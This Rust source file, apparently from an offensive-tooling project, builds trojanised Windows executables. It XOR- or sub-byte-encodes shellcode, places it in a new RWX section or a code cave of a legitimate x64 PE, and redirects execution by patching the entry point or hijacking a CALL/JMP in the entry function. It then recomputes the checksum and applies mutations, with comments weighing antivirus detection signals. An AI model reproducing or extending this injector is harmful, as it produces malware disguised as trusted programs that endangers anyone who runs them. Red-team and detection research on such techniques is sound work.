//! PE Injection Build Path
//!
//! Injects encoded shellcode into an existing legitimate PE binary by adding a new
//! section with a carrier stub, then redirecting the entry point. The resulting
//! artifact inherits the host PE's metadata, imports, and structure.
//!
//! ## Pipeline
//!
//! ```text
//! Target PE (e.g., hello_world.exe)
//!     → Validate (MZ, PE32+, x64)
//!     → Encode shellcode (XOR/SubByte/None via PayloadEncoder)
//!     → Build section data: [carrier_stub | key/metadata | encoded_payload]
//!     → Add section ".extra" (RWX)
//!     → Patch AddressOfEntryPoint → new section RVA
//!     → Recompute PE checksum
//!     → (Optional) Apply binary mutations via BinaryMutator
//!     → Validate with goblin
//!     → Write as <sha256>.exe
//! ```
//!
//! ## Limitations (v1)
//!
//! - RWX section is a static detection signal (future: split RW data + RX code)
//! - New section header is visible in section count analysis
//! - No IAT reuse (stub is self-contained PIC, unlike SuperMega's Cordyceps)
//! - Target PE must have room for one more section header

pub mod stubs;

use std::path::{Path, PathBuf};

use anyhow::{Context, Result, bail};
use iced_x86::{Decoder, DecoderOptions, FlowControl};
use sha2::{Digest, Sha256};
use tracing::{debug, info, warn};

use crate::mutator::MutationSpec;
use crate::template::{EncodingType, PayloadEncoder};
use crate::transform::BinaryMutator;

use stubs::{
    NONE_LAYOUT, NONE_STUB_CODE, SUBBYTE_LAYOUT, SUBBYTE_STUB_CODE, XOR_LAYOUT, XOR_STUB_CODE,
    build_subbyte_reverse_lut,
};

// --- PE Constants ---

const SECTION_HEADER_SIZE: usize = 40;
/// Section characteristics: CODE | INITIALIZED_DATA | MEM_EXECUTE | MEM_READ | MEM_WRITE
const SECTION_CHARACTERISTICS_RWX: u32 = 0xE000_0060;
/// Section characteristic bit: MEM_WRITE
const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
/// Section characteristic bit: MEM_EXECUTE
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
/// EP protection radius: bytes around entry point excluded from code caves.
const EP_PROTECTION_RADIUS: u32 = 0x100;

/// Default sub-byte nibble mapping (must match PayloadEncoder default).
const DEFAULT_SUBBYTE_MAPPING: [u8; 16] = [0, 2, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 20];

// --- Injection Mode Enums ---

/// Controls where the carrier+payload data is placed in the target PE.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum InjectionMode {
    /// Add a new ".extra" section (v1 behavior). Always succeeds.
    #[default]
    NewSection,
    /// Place carrier+payload in an existing section's code cave.
    /// Falls back to NewSection if no cave is large enough.
    CodeCave,
    /// (Reserved for v3) Place carrier in .text cave, payload in .rdata cave.
    SplitCave,
}

/// Controls how execution is redirected to the injected carrier.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum RedirectMode {
    /// Overwrite AddressOfEntryPoint in PE header (v1 behavior).
    #[default]
    HeaderPatch,
    /// Patch a CALL/JMP instruction in the EP function body.
    /// Falls back to HeaderPatch if no suitable instruction found.
    EpHijack,
}

// --- Public Types ---

/// Configuration for the PE injector (paths and output settings).
#[derive(Debug, Clone)]
pub struct PeInjectConfig {
    /// Specific target PE path (takes precedence over injectables_dir).
    pub target_pe_path: Option<PathBuf>,
    /// Directory of injectable PE targets for auto-selection.
    pub injectables_dir: Option<PathBuf>,
    /// Directory to write the output artifact.
    pub output_dir: PathBuf,
}

/// Input parameters for a single injection operation.
#[derive(Debug, Clone)]
pub struct PeInjectInput {
    /// Raw shellcode bytes to inject.
    pub payload: Vec<u8>,
    /// Encoding type (XOR, SubByte, or None). English is NOT supported.
    pub encoding: EncodingType,
    /// Optional binary mutations to apply after injection (e.g., rich_header, timestamp).
    pub binary_mutations: Vec<MutationSpec>,
    /// If true, the carrier stub will jump to the original entry point after shellcode
    /// execution (RIP-relative, ASLR-safe). If false, assumes shellcode terminates.
    pub return_to_oep: bool,
    /// Where to place carrier+payload (default: NewSection).
    pub injection_mode: InjectionMode,
    /// How to redirect execution to the carrier (default: HeaderPatch).
    pub redirect_mode: RedirectMode,
}

/// Metadata about a successfully injected artifact.
#[derive(Debug, Clone)]
pub struct InjectedArtifact {
    /// SHA256 hash of the output PE (used as artifact ID).
    pub artifact_id: String,
    /// Full path to the output .exe file.
    pub output_path: PathBuf,
    /// Size of the output PE in bytes.
    pub size_bytes: u64,
    /// Original AddressOfEntryPoint from the host PE (saved for reference).
    pub original_entry_point: u32,
    /// RVA of the injected section in the output PE.
    pub injected_section_rva: u32,
    /// List of binary mutation IDs that were applied after injection.
    pub mutations_applied: Vec<String>,
    /// Actual injection mode used (may differ from requested if fallback occurred).
    pub injection_mode_used: InjectionMode,
    /// Actual redirect mode used (may differ from requested if fallback occurred).
    pub redirect_mode_used: RedirectMode,
    /// Section name where data was placed (only set for CodeCave mode).
    pub cave_section: Option<String>,
    /// Name of the target PE that was used (e.g., "procexp64.exe").
    pub target_pe_name: String,
}

/// PE injection engine.
pub struct PeInjector {
    config: PeInjectConfig,
}

impl PeInjector {
    /// Create a new PeInjector with the given configuration.
    pub fn new(config: PeInjectConfig) -> Result<Self> {
        if config.target_pe_path.is_none() && config.injectables_dir.is_none() {
            bail!("Either target_pe_path or injectables_dir must be set");
        }
        if let Some(ref path) = config.target_pe_path
            && !path.exists()
        {
            bail!("Target PE not found: {}", path.display());
        }
        if let Some(ref dir) = config.injectables_dir
            && !dir.exists()
        {
            bail!("Injectables dir not found: {}", dir.display());
        }
        std::fs::create_dir_all(&config.output_dir).context("Failed to create output directory")?;
        Ok(Self { config })
    }

    /// Inject shellcode into the target PE.
    ///
    /// If `config.target_pe_path` is set, uses it directly.
    /// Otherwise, scans `config.injectables_dir` and auto-selects the best target
    /// for the given payload size, encoding, and injection/redirect modes.
    ///
    /// Returns metadata about the produced artifact.
    pub fn inject(&self, input: &PeInjectInput) -> Result<InjectedArtifact> {
        // Reject English encoding — produces text, not binary
        if input.encoding == EncodingType::English {
            bail!(
                "English encoding is not compatible with PE injection (produces text, not binary bytes)"
            );
        }

        // Resolve target PE path
        let target_path = if let Some(ref path) = self.config.target_pe_path {
            path.clone()
        } else if let Some(ref dir) = self.config.injectables_dir {
            let targets = scan_injectables_dir(dir)?;
            let selected = select_best_target(
                &targets,
                input.payload.len(),
                input.encoding,
                input.injection_mode,
                input.redirect_mode,
            )
            .ok_or_else(|| {
                anyhow::anyhow!(
                    "No suitable target PE in {} for payload ({} bytes, {:?} mode)",
                    dir.display(),
                    input.payload.len(),
                    input.injection_mode,
                )
            })?;
            info!(
                "Auto-selected target: {} (cave: {} bytes)",
                selected.path.display(),
                selected.largest_cave_bytes
            );
            selected.path.clone()
        } else {
            bail!("Either target_pe_path or injectables_dir must be set");
        };

        let target_pe_name = target_path
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default();

        // 1. Read target PE
        let mut pe_bytes = std::fs::read(&target_path).context("Failed to read target PE")?;

        // 2. Validate PE structure
        validate_pe(&pe_bytes)?;

        // 3. Read original entry point
        let opt_header_off = optional_header_offset(&pe_bytes);
        let original_ep = read_u32(&pe_bytes, opt_header_off + 0x10);
        debug!("Original entry point: {:#x}", original_ep);

        // 4. Encode payload
        let encoder = PayloadEncoder::new();
        let encoded = encoder.encode(&input.payload, input.encoding);
        let encoded_data = &encoded.data;
        debug!(
            "Encoded payload: {} bytes (encoding: {:?})",
            encoded_data.len(),
            input.encoding
        );

        // 5. Select stub and build section data
        let (stub_code, layout, key_bytes) = match input.encoding {
            EncodingType::Xor => {
                let key = [
                    encoded
                        .metadata
                        .get("xor_key_0")
                        .and_then(|s| u8::from_str_radix(s.trim_start_matches("0x"), 16).ok())
                        .unwrap_or(0xAA),
                    encoded
                        .metadata
                        .get("xor_key_1")
                        .and_then(|s| u8::from_str_radix(s.trim_start_matches("0x"), 16).ok())
                        .unwrap_or(0x55),
                ];
                (XOR_STUB_CODE, XOR_LAYOUT, key.to_vec())
            }
            EncodingType::SubByte => {
                let reverse_lut = build_subbyte_reverse_lut(&DEFAULT_SUBBYTE_MAPPING);
                (SUBBYTE_STUB_CODE, SUBBYTE_LAYOUT, reverse_lut.to_vec())
            }
            EncodingType::None => (NONE_STUB_CODE, NONE_LAYOUT, Vec::new()),
            EncodingType::English => unreachable!(), // rejected above
        };

        // Build mutable copy of stub code for patching
        let mut stub = stub_code.to_vec();

        // Patch payload length (for XOR and SubByte stubs)
        if layout.payload_len_patch != usize::MAX {
            let payload_len = match input.encoding {
                // SubByte: original payload length (stub decodes 2N → N)
                EncodingType::SubByte => input.payload.len() as u32,
                // XOR: encoded length == original length
                _ => encoded_data.len() as u32,
            };
            write_u32_at(&mut stub, layout.payload_len_patch, payload_len);
        }

        // Handle OEP return
        if let (Some(_oep_patch), Some(oep_lea_off)) = (layout.oep_patch, layout.oep_lea_offset)
            && !input.return_to_oep
        {
            // NOP out the lea+jmp sequence so execution falls through to cleanup
            for i in 0..layout.oep_sequence_len {
                stub[oep_lea_off + i] = 0x90; // NOP
            }
        }
        // If return_to_oep is true, OEP_DELTA is patched after we know the section RVA

        // 6. Assemble section data: [stub | key | encoded_payload]
        let mut section_data =
            Vec::with_capacity(stub.len() + key_bytes.len() + encoded_data.len());
        section_data.extend_from_slice(&stub);
        section_data.extend_from_slice(&key_bytes);
        section_data.extend_from_slice(encoded_data);

        // 7. Place section data in PE (mode-dependent)
        let mut injection_mode_used = input.injection_mode;
        let mut cave_section: Option<String> = None;

        let section_rva = match input.injection_mode {
            InjectionMode::CodeCave => {
                let caves = find_code_caves(&pe_bytes);
                let needed = section_data.len();
                match select_best_cave(&caves, needed, input.encoding) {
                    Some(idx) => {
                        let cave = &caves[idx];
                        let needs_write =
                            matches!(input.encoding, EncodingType::Xor | EncodingType::SubByte);
                        if needs_write && (cave.characteristics & IMAGE_SCN_MEM_WRITE) == 0 {
                            // Add MEM_WRITE to section characteristics
                            let (sec_off, _) = section_table_info(&pe_bytes);
                            let so = sec_off + cave.section_index * SECTION_HEADER_SIZE;
                            let new_chars = cave.characteristics | IMAGE_SCN_MEM_WRITE;
                            write_u32_at(&mut pe_bytes, so + 36, new_chars);
                            debug!(
                                "Added MEM_WRITE to section '{}' for in-place decode",
                                cave.section_name
                            );
                        }
                        cave_section = Some(cave.section_name.clone());
                        let rva = inject_into_cave(&mut pe_bytes, cave, &section_data)?;
                        debug!(
                            "Injected into code cave in '{}' at RVA {:#x} ({} bytes)",
                            cave.section_name, rva, needed
                        );
                        rva
                    }
                    None => {
                        debug!(
                            "No suitable code cave found (need {} bytes), falling back to NewSection",
                            needed
                        );
                        injection_mode_used = InjectionMode::NewSection;
                        add_section(
                            &mut pe_bytes,
                            b".extra\0\0",
                            &section_data,
                            SECTION_CHARACTERISTICS_RWX,
                        )?
                    }
                }
            }
            InjectionMode::NewSection => add_section(
                &mut pe_bytes,
                b".extra\0\0",
                &section_data,
                SECTION_CHARACTERISTICS_RWX,
            )?,
            InjectionMode::SplitCave => {
                bail!("SplitCave injection mode is not yet implemented (reserved for v3)");
            }
        };
        debug!(
            "Injected data RVA: {:#x} (mode: {:?})",
            section_rva, injection_mode_used
        );

        // 8. Patch OEP return delta (now that we know section_rva)
        if input.return_to_oep {
            if let Some(oep_patch) = layout.oep_patch {
                // The lea rax instruction is at section_rva + oep_lea_offset
                // RIP after lea = section_rva + oep_patch + 4 (lea is 7 bytes: 3 opcode + 4 imm32)
                let rip_after_lea = section_rva + oep_patch as u32 + 4;
                let oep_delta = original_ep as i32 - rip_after_lea as i32;

                // Write delta into the section data in the PE
                let section_file_offset = rva_to_offset(&pe_bytes, section_rva)
                    .context("Failed to find section file offset for OEP patching")?;
                let patch_file_offset = section_file_offset + oep_patch;
                write_u32_at(&mut pe_bytes, patch_file_offset, oep_delta as u32);
            }
            if input.redirect_mode == RedirectMode::EpHijack {
                warn!(
                    "return_to_oep with EpHijack may cause re-entry loop — shellcode should terminate the process"
                );
            }
        }

        // 9. Redirect execution to carrier (mode-dependent)
        let mut redirect_mode_used = input.redirect_mode;
        match input.redirect_mode {
            RedirectMode::EpHijack => {
                match find_hijack_site(&pe_bytes, original_ep, 256) {
                    Some(site) => {
                        // Safety: verify hijack site doesn't overlap with injected data
                        let hijack_range = site.rva..site.rva + site.instruction_len as u32;
                        let payload_range = section_rva..section_rva + section_data.len() as u32;
                        if ranges_overlap(hijack_range.clone(), payload_range.clone()) {
                            debug!(
                                "Hijack site [{:#x}..{:#x}] overlaps injected data [{:#x}..{:#x}], falling back to HeaderPatch",
                                hijack_range.start,
                                hijack_range.end,
                                payload_range.start,
                                payload_range.end,
                            );
                            redirect_mode_used = RedirectMode::HeaderPatch;
                            write_u32_at(&mut pe_bytes, opt_header_off + 0x10, section_rva);
                        } else {
                            apply_ep_hijack(&mut pe_bytes, &site, section_rva);
                            debug!(
                                "EP hijacked: patched {}-byte instruction at {:#x} → JMP {:#x}",
                                site.instruction_len, site.rva, section_rva,
                            );
                        }
                    }
                    None => {
                        debug!(
                            "No suitable hijack site found in EP function, falling back to HeaderPatch"
                        );
                        redirect_mode_used = RedirectMode::HeaderPatch;
                        write_u32_at(&mut pe_bytes, opt_header_off + 0x10, section_rva);
                    }
                }
            }
            RedirectMode::HeaderPatch => {
                write_u32_at(&mut pe_bytes, opt_header_off + 0x10, section_rva);
                debug!(
                    "Entry point patched: {:#x} → {:#x}",
                    original_ep, section_rva
                );
            }
        }

        // 10. Recompute PE checksum
        compute_pe_checksum(&mut pe_bytes);

        // 11. Validate with goblin
        goblin::pe::PE::parse(&pe_bytes)
            .map_err(|e| anyhow::anyhow!("Injection produced invalid PE: {}", e))?;
        info!("PE validation passed after injection");

        // 12. Optional binary mutations
        let mut mutations_applied = Vec::new();
        if !input.binary_mutations.is_empty() {
            let specs: Vec<&MutationSpec> = input.binary_mutations.iter().collect();
            let mutator = BinaryMutator::new(pe_bytes);
            let (mutated_bytes, applied) = mutator
                .apply(&specs)
                .context("Binary mutations after injection failed")?;
            pe_bytes = mutated_bytes;
            mutations_applied = applied;
        }

        // 13. Write output file
        let sha256 = {
            let mut hasher = Sha256::new();
            hasher.update(&pe_bytes);
            hex::encode(hasher.finalize())
        };
        let output_path = self.config.output_dir.join(format!("{}.exe", sha256));
        std::fs::write(&output_path, &pe_bytes).context("Failed to write output PE")?;

        let size_bytes = pe_bytes.len() as u64;
        info!(
            "Injected artifact written: {} ({} bytes)",
            output_path.display(),
            size_bytes
        );

        Ok(InjectedArtifact {
            artifact_id: sha256,
            output_path,
            size_bytes,
            original_entry_point: original_ep,
            injected_section_rva: section_rva,
            mutations_applied,
            injection_mode_used,
            redirect_mode_used,
            cave_section,
            target_pe_name,
        })
    }
}

// =============================================================================
// PE Helper Functions
// =============================================================================

/// Validate that the byte slice is a valid PE32+ x64 binary.
fn validate_pe(pe_bytes: &[u8]) -> Result<()> {
    if pe_bytes.len() < 64 {
        bail!("File too small to be a PE ({} bytes)", pe_bytes.len());
    }
    if &pe_bytes[0..2] != b"MZ" {
        bail!("Missing MZ signature");
    }

    let e_lfanew = read_u32(pe_bytes, 0x3C) as usize;
    if e_lfanew + 4 > pe_bytes.len() {
        bail!("e_lfanew ({:#x}) points beyond file", e_lfanew);
    }
    if &pe_bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        bail!("Missing PE signature at e_lfanew ({:#x})", e_lfanew);
    }

    // Check Machine type: must be x64 (0x8664)
    let machine = read_u16(pe_bytes, e_lfanew + 4);
    if machine != 0x8664 {
        bail!(
            "Unsupported machine type: {:#x} (expected 0x8664 / IMAGE_FILE_MACHINE_AMD64)",
            machine
        );
    }

    // Check PE32+ magic (0x020B)
    let opt_header_off = e_lfanew + 4 + 20;
    if opt_header_off + 2 > pe_bytes.len() {
        bail!("Optional header too short");
    }
    let magic = read_u16(pe_bytes, opt_header_off);
    if magic != 0x020B {
        bail!(
            "Not PE32+ (magic {:#x}, expected 0x020B). 32-bit PEs are not supported.",
            magic
        );
    }

    Ok(())
}

/// Get offset of the PE optional header.
fn optional_header_offset(pe_bytes: &[u8]) -> usize {
    let e_lfanew = read_u32(pe_bytes, 0x3C) as usize;
    e_lfanew + 4 + 20 // PE sig (4) + COFF header (20)
}

/// Get section table offset and count.
fn section_table_info(pe_bytes: &[u8]) -> (usize, usize) {
    let e_lfanew = read_u32(pe_bytes, 0x3C) as usize;
    let coff_offset = e_lfanew + 4;
    let num_sections = read_u16(pe_bytes, coff_offset + 2) as usize;
    let opt_header_size = read_u16(pe_bytes, coff_offset + 16) as usize;
    let section_table_offset = coff_offset + 20 + opt_header_size;
    (section_table_offset, num_sections)
}

/// Get FileAlignment from optional header.
fn file_alignment(pe_bytes: &[u8]) -> u32 {
    read_u32(pe_bytes, optional_header_offset(pe_bytes) + 0x24)
}

/// Get SectionAlignment from optional header.
fn section_alignment(pe_bytes: &[u8]) -> u32 {
    read_u32(pe_bytes, optional_header_offset(pe_bytes) + 0x20)
}

/// Get SizeOfImage from optional header.
fn size_of_image(pe_bytes: &[u8]) -> u32 {
    read_u32(pe_bytes, optional_header_offset(pe_bytes) + 0x38)
}

/// Get SizeOfHeaders from optional header.
fn size_of_headers(pe_bytes: &[u8]) -> u32 {
    read_u32(pe_bytes, optional_header_offset(pe_bytes) + 0x3C)
}

/// Add a new section to the PE. Returns the section's RVA.
fn add_section(
    pe_bytes: &mut Vec<u8>,
    name: &[u8; 8],
    data: &[u8],
    characteristics: u32,
) -> Result<u32> {
    let (sec_table_off, num_sec) = section_table_info(pe_bytes);
    let file_align = file_alignment(pe_bytes);
    let sec_align = section_alignment(pe_bytes);
    let headers_size = size_of_headers(pe_bytes);

    // Check room for another section header
    let new_header_end = sec_table_off + (num_sec + 1) * SECTION_HEADER_SIZE;
    if new_header_end as u32 > headers_size {
        bail!(
            "No room for new section header (need {:#x}, headers end at {:#x})",
            new_header_end,
            headers_size
        );
    }

    // Find last section to determine new VA and file offset
    let (last_va, last_vs, last_raw_ptr, last_raw_size) = if num_sec > 0 {
        let last = sec_table_off + (num_sec - 1) * SECTION_HEADER_SIZE;
        (
            read_u32(pe_bytes, last + 12),
            read_u32(pe_bytes, last + 8),
            read_u32(pe_bytes, last + 20),
            read_u32(pe_bytes, last + 16),
        )
    } else {
        (0, 0, headers_size, 0)
    };

    let new_va = align_up(last_va + std::cmp::max(last_vs, last_raw_size), sec_align);
    let new_raw_ptr = align_up(last_raw_ptr + last_raw_size, file_align);
    let padded_size = align_up(data.len() as u32, file_align);

    // Extend file
    let required_size = new_raw_ptr as usize + padded_size as usize;
    if pe_bytes.len() < required_size {
        pe_bytes.resize(required_size, 0);
    }

    // Write section data
    pe_bytes[new_raw_ptr as usize..new_raw_ptr as usize + data.len()].copy_from_slice(data);

    // Write section header
    let hdr_off = sec_table_off + num_sec * SECTION_HEADER_SIZE;
    pe_bytes[hdr_off..hdr_off + 8].copy_from_slice(name);
    write_u32_at(pe_bytes, hdr_off + 8, data.len() as u32); // VirtualSize
    write_u32_at(pe_bytes, hdr_off + 12, new_va); // VirtualAddress
    write_u32_at(pe_bytes, hdr_off + 16, padded_size); // SizeOfRawData
    write_u32_at(pe_bytes, hdr_off + 20, new_raw_ptr); // PointerToRawData
    write_u32_at(pe_bytes, hdr_off + 36, characteristics); // Characteristics

    // Update NumberOfSections
    let e_lfanew = read_u32(pe_bytes, 0x3C) as usize;
    write_u16_at(pe_bytes, e_lfanew + 4 + 2, num_sec as u16 + 1);

    // Update SizeOfImage
    let new_image_end = align_up(new_va + data.len() as u32, sec_align);
    let current_image_size = size_of_image(pe_bytes);
    if new_image_end > current_image_size {
        let opt_off = optional_header_offset(pe_bytes);
        write_u32_at(pe_bytes, opt_off + 0x38, new_image_end);
    }

    debug!(
        "Added section '{}' VA={:#x} raw={:#x} size={:#x}",
        String::from_utf8_lossy(name).trim_end_matches('\0'),
        new_va,
        new_raw_ptr,
        data.len()
    );

    Ok(new_va)
}

/// Compute and write the standard PE checksum.
fn compute_pe_checksum(pe_bytes: &mut Vec<u8>) {
    let opt_off = optional_header_offset(pe_bytes);
    let checksum_offset = opt_off + 0x40;
    if checksum_offset + 4 > pe_bytes.len() {
        return;
    }
    // Zero the field first
    write_u32_at(pe_bytes, checksum_offset, 0);

    let mut sum: u32 = 0;
    let len = pe_bytes.len();
    for i in (0..len).step_by(2) {
        if i == checksum_offset || i == checksum_offset + 2 {
            continue;
        }
        let word = if i + 1 < len {
            u16::from_le_bytes([pe_bytes[i], pe_bytes[i + 1]]) as u32
        } else {
            pe_bytes[i] as u32
        };
        sum += word;
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    sum = (sum & 0xFFFF) + (sum >> 16);
    sum += len as u32;
    write_u32_at(pe_bytes, checksum_offset, sum);
}

/// Convert RVA to file offset using section table.
fn rva_to_offset(pe_bytes: &[u8], rva: u32) -> Option<usize> {
    let (sec_off, num_sec) = section_table_info(pe_bytes);
    for i in 0..num_sec {
        let so = sec_off + i * SECTION_HEADER_SIZE;
        let va = read_u32(pe_bytes, so + 12);
        let vs = read_u32(pe_bytes, so + 8);
        let raw_size = read_u32(pe_bytes, so + 16);
        let raw_ptr = read_u32(pe_bytes, so + 20);
        let section_size = std::cmp::max(vs, raw_size);
        if rva >= va && rva < va + section_size {
            return Some((raw_ptr + (rva - va)) as usize);
        }
    }
    None
}

// --- Byte-level helpers ---

fn read_u16(buf: &[u8], offset: usize) -> u16 {
    u16::from_le_bytes(buf[offset..offset + 2].try_into().unwrap())
}

fn read_u32(buf: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes(buf[offset..offset + 4].try_into().unwrap())
}

fn write_u16_at(buf: &mut [u8], offset: usize, val: u16) {
    buf[offset..offset + 2].copy_from_slice(&val.to_le_bytes());
}

fn write_u32_at(buf: &mut [u8], offset: usize, val: u32) {
    buf[offset..offset + 4].copy_from_slice(&val.to_le_bytes());
}

fn align_up(val: u32, align: u32) -> u32 {
    if align == 0 {
        return val;
    }
    (val + align - 1) & !(align - 1)
}

// =============================================================================
// Code Cave Injection (E1)
// =============================================================================

/// A zero-filled gap between VirtualSize and SizeOfRawData in an existing section.
#[derive(Debug, Clone)]
struct CodeCave {
    section_index: usize,
    section_name: String,
    /// File offset of the usable cave start.
    file_offset: usize,
    /// RVA of the usable cave start.
    rva: u32,
    /// Bytes available for injection.
    available: usize,
    /// Section characteristics flags.
    characteristics: u32,
}

/// Scan all sections for zero-filled padding gaps (code caves).
///
/// Returns caves sorted by available size (largest first), excluding bytes
/// that overlap with the EP ± 0x100 protected zone.
fn find_code_caves(pe_bytes: &[u8]) -> Vec<CodeCave> {
    let (sec_off, num_sec) = section_table_info(pe_bytes);
    let opt_header_off = optional_header_offset(pe_bytes);
    let entry_rva = read_u32(pe_bytes, opt_header_off + 0x10);

    let ep_prot_start = entry_rva.saturating_sub(EP_PROTECTION_RADIUS);
    let ep_prot_end = entry_rva.saturating_add(EP_PROTECTION_RADIUS);

    let mut caves = Vec::new();

    for i in 0..num_sec {
        let so = sec_off + i * SECTION_HEADER_SIZE;
        let mut name_bytes = [0u8; 8];
        name_bytes.copy_from_slice(&pe_bytes[so..so + 8]);
        let section_name = String::from_utf8_lossy(&name_bytes)
            .trim_end_matches('\0')
            .to_string();
        let vs = read_u32(pe_bytes, so + 8);
        let va = read_u32(pe_bytes, so + 12);
        let raw_size = read_u32(pe_bytes, so + 16);
        let raw_ptr = read_u32(pe_bytes, so + 20);
        let characteristics = read_u32(pe_bytes, so + 36);

        if raw_size <= vs {
            continue; // No gap
        }

        let gap_start_rva = va + vs;
        let gap_end_rva = va + raw_size;
        let gap_start_file = (raw_ptr + vs) as usize;
        let gap_end_file = (raw_ptr + raw_size) as usize;

        // Verify gap bytes are all zero
        if gap_end_file > pe_bytes.len() {
            continue;
        }
        if !pe_bytes[gap_start_file..gap_end_file]
            .iter()
            .all(|&b| b == 0)
        {
            continue;
        }

        // Trim cave to exclude EP ± 0x100 protected zone
        let mut cave_rva_start = gap_start_rva;
        if cave_rva_start < ep_prot_end && gap_end_rva > ep_prot_start {
            cave_rva_start = std::cmp::max(cave_rva_start, ep_prot_end);
        }

        if cave_rva_start >= gap_end_rva {
            continue; // Entire cave within protection zone
        }

        let available = (gap_end_rva - cave_rva_start) as usize;
        let file_offset = (raw_ptr + (cave_rva_start - va)) as usize;

        caves.push(CodeCave {
            section_index: i,
            section_name,
            file_offset,
            rva: cave_rva_start,
            available,
            characteristics,
        });
    }

    caves.sort_by(|a, b| b.available.cmp(&a.available));
    caves
}

/// Write data into a code cave, centered within the available space.
///
/// Updates the section's VirtualSize to cover the written data.
/// Returns the RVA where the data starts.
fn inject_into_cave(pe_bytes: &mut Vec<u8>, cave: &CodeCave, data: &[u8]) -> Result<u32> {
    if data.len() > cave.available {
        bail!(
            "Data ({} bytes) exceeds cave capacity ({} bytes)",
            data.len(),
            cave.available
        );
    }

    // Center data in cave (SuperMega centering pattern)
    let center_offset = (cave.available - data.len()) / 2;
    let write_file_offset = cave.file_offset + center_offset;

    // Write data
    pe_bytes[write_file_offset..write_file_offset + data.len()].copy_from_slice(data);

    // Update section VirtualSize to cover through end of written data
    let (sec_off, _) = section_table_info(pe_bytes);
    let so = sec_off + cave.section_index * SECTION_HEADER_SIZE;
    let va = read_u32(pe_bytes, so + 12);
    let old_vs = read_u32(pe_bytes, so + 8);

    let write_end_rva = cave.rva + center_offset as u32 + data.len() as u32;
    let new_vs = write_end_rva - va;

    if new_vs > old_vs {
        write_u32_at(pe_bytes, so + 8, new_vs);

        // Update SizeOfImage if aligned VS crosses a section alignment boundary
        let sec_align = section_alignment(pe_bytes);
        if align_up(new_vs, sec_align) > align_up(old_vs, sec_align) {
            let new_end = align_up(va + new_vs, sec_align);
            let current_image_size = size_of_image(pe_bytes);
            if new_end > current_image_size {
                let opt_off = optional_header_offset(pe_bytes);
                write_u32_at(pe_bytes, opt_off + 0x38, new_end);
            }
        }
    }

    Ok(cave.rva + center_offset as u32)
}

/// Select the best cave for the given encoding type.
///
/// For `None`: prefer executable sections (no write needed).
/// For `Xor`/`SubByte`: prefer writable sections (avoid adding MEM_WRITE).
/// Returns index into the caves slice.
fn select_best_cave(caves: &[CodeCave], needed: usize, encoding: EncodingType) -> Option<usize> {
    let needs_write = matches!(encoding, EncodingType::Xor | EncodingType::SubByte);

    if needs_write {
        // Prefer already-writable sections
        if let Some(idx) = caves
            .iter()
            .position(|c| c.available >= needed && (c.characteristics & IMAGE_SCN_MEM_WRITE) != 0)
        {
            return Some(idx);
        }
        // Fall back to any section (will add MEM_WRITE)
        caves.iter().position(|c| c.available >= needed)
    } else {
        // For None encoding, prefer executable sections
        if let Some(idx) = caves
            .iter()
            .position(|c| c.available >= needed && (c.characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
        {
            return Some(idx);
        }
        caves.iter().position(|c| c.available >= needed)
    }
}

// =============================================================================
// EP Function Hijack (E2)
// =============================================================================

/// A CALL/JMP instruction in the EP function body suitable for hijacking.
#[derive(Debug, Clone)]
struct HijackSite {
    /// File offset of the instruction.
    file_offset: usize,
    /// RVA of the instruction.
    rva: u32,
    /// Length of the original instruction (>= 5).
    instruction_len: usize,
}

/// Disassemble the EP function and find a CALL/JMP/Jcc instruction suitable for hijacking.
///
/// Skips the first instruction (preserve EP prologue). Returns the first suitable
/// instruction with `len >= 5`, preferring CALL > JMP > Jcc.
/// Stops scanning on RET or after `scan_limit` bytes.
fn find_hijack_site(pe_bytes: &[u8], entry_rva: u32, scan_limit: usize) -> Option<HijackSite> {
    let file_offset = rva_to_offset(pe_bytes, entry_rva)?;
    let end = std::cmp::min(file_offset + scan_limit, pe_bytes.len());
    if file_offset >= end {
        return None;
    }
    let ep_bytes = &pe_bytes[file_offset..end];

    let mut decoder = Decoder::with_ip(64, ep_bytes, entry_rva as u64, DecoderOptions::NONE);
    let mut first = true;

    for instr in &mut decoder {
        if instr.is_invalid() {
            break;
        }

        // Skip first instruction (let EP prologue start normally)
        if first {
            first = false;
            continue;
        }

        match instr.flow_control() {
            FlowControl::Return => break,
            FlowControl::Call
            | FlowControl::UnconditionalBranch
            | FlowControl::ConditionalBranch
                if instr.len() >= 5 =>
            {
                let instr_file_off = file_offset + (instr.ip() - entry_rva as u64) as usize;
                return Some(HijackSite {
                    file_offset: instr_file_off,
                    rva: instr.ip() as u32,
                    instruction_len: instr.len(),
                });
            }
            _ => continue,
        }
    }

    None
}

/// Overwrite a hijack site with `JMP rel32` to the target RVA, NOP-filling any remainder.
fn apply_ep_hijack(pe_bytes: &mut [u8], site: &HijackSite, target_rva: u32) {
    let rel32 = target_rva as i32 - (site.rva as i32 + 5);
    pe_bytes[site.file_offset] = 0xE9; // JMP rel32
    pe_bytes[site.file_offset + 1..site.file_offset + 5].copy_from_slice(&rel32.to_le_bytes());
    // NOP-fill remaining bytes of the original instruction
    for i in 5..site.instruction_len {
        pe_bytes[site.file_offset + i] = 0x90;
    }
}

/// Check if two RVA ranges overlap.
fn ranges_overlap(a: std::ops::Range<u32>, b: std::ops::Range<u32>) -> bool {
    a.start < b.end && b.start < a.end
}

// =============================================================================
// Target Scanning & Selection
// =============================================================================

/// Per-PE suitability report for injectable target selection.
#[derive(Debug, Clone)]
pub struct TargetInfo {
    /// Path to the PE file.
    pub path: PathBuf,
    /// File size in bytes.
    pub file_size: u64,
    /// Number of sections.
    pub num_sections: usize,
    /// Largest code cave available (after EP protection exclusion).
    pub largest_cave_bytes: usize,
    /// Section name containing the largest cave.
    pub largest_cave_section: Option<String>,
    /// Whether the EP function has a hijackable CALL/JMP instruction.
    pub has_hijack_site: bool,
    /// Whether any cave resides in an already-writable section.
    pub has_writable_section_cave: bool,
    /// Whether validation passed (valid PE32+ x64).
    pub valid: bool,
    /// Error message if validation failed.
    pub error: Option<String>,
}

